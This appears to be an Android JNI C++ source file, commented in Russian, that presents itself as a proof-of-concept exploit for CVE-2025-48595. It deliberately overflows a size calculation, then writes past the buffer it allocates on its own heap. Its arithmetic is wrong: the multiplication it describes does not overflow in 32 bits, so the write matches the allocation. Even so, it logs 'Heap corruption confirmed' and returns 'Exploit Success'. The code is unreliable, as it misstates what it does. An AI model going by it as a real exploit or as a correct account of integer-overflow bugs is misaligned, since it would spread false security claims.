#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint> // Для uint32_t, size_t

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// Функция должна совпадать с именем в Java:
// Java + Пакет (с подчёркиваниями вместо точек) + ИмяКласса + ИМЕТод
extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {

    LOGI("=== NATIVE EXPLOIT STARTED ===");

    // 1. Создаем переполнение целого числа
    // Мы умножаем большое число на коэффициент, чтобы результат вышел за пределы uint32_t
    uint32_t input = 0xFFFFFFF;       // Почти 268 млн
    uint32_t multiplier = 16;         // Умножаем

    // Вычисляем. На 32-битной архитектуре (или при приведении к uint32) это переполнится.
    // 0xFFFFFFF * 16 = 0x1FFFFFE0. В uint32_t это отбрасывает старшую единицу -> 0xFFFFFE0 (маленькое число!)
    uint32_t overflowed_size = (uint32_t)(input * multiplier);

    LOGI("Input: 0x%X, Multiplier: %d", input, multiplier);
    LOGI("Math result (full): 0x%llX", (long long)input * multiplier);
    LOGI("Overflowed Size (uint32): %u bytes (0x%X)", overflowed_size, overflowed_size);

    // 2. Выделяем память ПО "маленькому" размеру
    char *buffer = (char *)malloc(overflowed_size);

    if (buffer == NULL) {
        LOGE("malloc failed for %u bytes", overflowed_size);
        return env->NewStringUTF("FAIL: malloc returned NULL");
    }

    LOGI("Allocated buffer at 0x%p with size %u", (void*)buffer, overflowed_size);

    // 3. ПИШЕМ в этот буфер ДАННЫЕ размером с ИСХОДНОЕ переполненное значение!
    // Мы пишем больше, чем выделили. Это и есть Heap Corruption.
    size_t write_size = (size_t)input * multiplier;

    LOGI("Writing %zu bytes into a buffer of only %u bytes...", write_size, overflowed_size);

    memset(buffer, 'A', write_size); // Заполняем память буквами 'A'

    LOGI("Write complete. Heap corruption confirmed in Logcat!");

    // 4. Чистим (в реальном эксплоите тут мы бы не вызывали free, или делали это хитро)
    free(buffer);

    std::string result = "Exploit Success! Check Logcat for 'Heap corruption'.";
    return env->NewStringUTF(result.c_str());
}